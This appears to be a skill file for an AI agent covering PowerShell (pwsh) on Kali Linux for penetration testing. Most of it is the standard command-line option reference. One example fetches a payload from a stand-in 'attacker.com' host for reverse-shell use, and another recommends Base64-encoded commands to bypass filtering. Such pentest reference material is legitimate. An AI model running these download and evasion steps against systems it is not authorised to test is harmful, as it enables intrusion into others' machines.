---
name: powershell
description: Execute PowerShell commands and scripts on Linux or Windows. Use for automation, configuration management, post-exploitation, and executing complex scripts or Base64-encoded commands during penetration testing.
---

# powershell (pwsh)

## Overview
PowerShell is a cross-platform task automation solution made up of a command-line shell, a scripting language, and a configuration management framework. In Kali Linux, it is provided by the `pwsh` binary. Category: Post-Exploitation / Automation.

## Installation (if not already installed)
Assume `pwsh` is already installed. If not:
```bash
sudo apt install powershell
```

## Common Workflows

### Execute a simple command and exit
```bash
pwsh -Command "Get-Process"
```

### Run a script file with parameters
```bash
pwsh -File ./exploit.ps1 -Target 192.168.1.100
```

### Execute a Base64 encoded command
Useful for bypassing character filtering or complex quoting issues.
```bash
# Example: dir "c:\program files"
pwsh -EncodedCommand ZABpAHIAIAAiAGMAOgBcAHAAcgBvAGcAcgBhAG0AIABmAGkAbABlAHMAIgAgAA==
```

### Run without profile and non-interactively
Ideal for automated tasks or reverse shells to reduce overhead and prevent hanging.
```bash
pwsh -NoProfile -NonInteractive -Command "Invoke-WebRequest -Uri http://attacker.com/payload.ps1 -OutFile payload.ps1"
```

## Complete Command Reference

### Usage
```
pwsh[.exe] [-Login] [[-File] <filePath> [args]]
           [-Command { - | <script-block> [-args <arg-array>] | <string> [<CommandParameters>] } ]
           [-CommandWithArgs <string> [<CommandParameters>]
           [-ConfigurationName <string>] [-ConfigurationFile <filePath>]
           [-CustomPipeName <string>] [-EncodedCommand <Base64EncodedCommand>]
           [-ExecutionPolicy <ExecutionPolicy>] [-InputFormat {Text | XML}]
           [-Interactive] [-MTA] [-NoExit] [-NoLogo] [-NonInteractive] [-NoProfile]
           [-NoProfileLoadTime] [-OutputFormat {Text | XML}] 
           [-SettingsFile <filePath>] [-SSHServerMode] [-STA] 
           [-Version] [-WindowStyle <style>] 
           [-WorkingDirectory <directoryPath>]
```

### Options

| Flag | Description |
|------|-------------|
| `-File`, `-f` | Runs the specified script in the local scope ("dot-sourced"). Must be the last parameter. Use `-` to read from stdin. |
| `-Command`, `-c` | Executes specified commands. Can be a string, script block, or `-` for stdin. |
| `-CommandWithArgs`, `-cwa` | [Experimental] Executes a command and populates the `$args` variable with subsequent arguments. |
| `-ConfigurationName`, `-config` | Specifies a configuration endpoint (e.g., AdminRoles). |
| `-ConfigurationFile` | Specifies a session configuration (.pssc) file path. |
| `-CustomPipeName` | Specifies a name for an additional IPC server (named pipe) for debugging. |
| `-EncodedCommand`, `-e`, `-ec` | Accepts a Base64-encoded UTF-16 string version of a command. |
| `-ExecutionPolicy`, `-ex`, `-ep` | Sets default execution policy (Windows only). |
| `-InputFormat`, `-inp`, `-if` | Format of data sent to PowerShell: `Text` or `XML`. |
| `-Interactive`, `-i` | Presents an interactive prompt to the user. |
| `-Login`, `-l` | Starts as a login shell (Linux/macOS only). Must be the first parameter. |
| `-MTA` | Start using a multi-threaded apartment (Windows only). |
| `-NoExit`, `-noe` | Does not exit after running startup commands. |
| `-NoLogo`, `-nol` | Hides the copyright banner at startup. |
| `-NonInteractive`, `-noni` | Does not present an interactive prompt; errors out on interactive attempts. |
| `-NoProfile`, `-nop` | Does not load the PowerShell profiles. |
| `-NoProfileLoadTime` | Hides profile load time if it exceeds 500ms. |
| `-OutputFormat`, `-o`, `-of` | Format of output: `Text` or `XML`. |
| `-SettingsFile`, `-settings` | Overrides the system-wide `powershell.config.json` file. |
| `-SSHServerMode`, `-sshs` | Used for running PowerShell as an SSH subsystem. |
| `-STA` | Start using a single-threaded apartment (Default, Windows only). |
| `-Version`, `-v` | Displays the version of PowerShell. |
| `-WindowStyle`, `-w` | Sets window style: `Normal`, `Minimized`, `Maximized`, or `Hidden`. |
| `-WorkingDirectory`, `-wd` | Sets the initial working directory at startup. |
| `-Help`, `-?`, `/?` | Displays help message. |

## Notes
- **Case Sensitivity**: All parameters are case-insensitive.
- **Linux Profiles**: When using `-Login` on Linux, PowerShell executes `/etc/profile` and `~/.profile`.
- **Exit Codes**: 
    - Normal termination: `0`.
    - Script-terminating error: `1`.
    - `-Command` exit code is determined by the last command executed (`$?`).
- **Standard Input**: To pipe commands into PowerShell, use `-Command -` or `-File -`.
- **WSL Warning**: Setting `pwsh` as the login shell in Windows Subsystem for Linux is not supported and may break interactivity.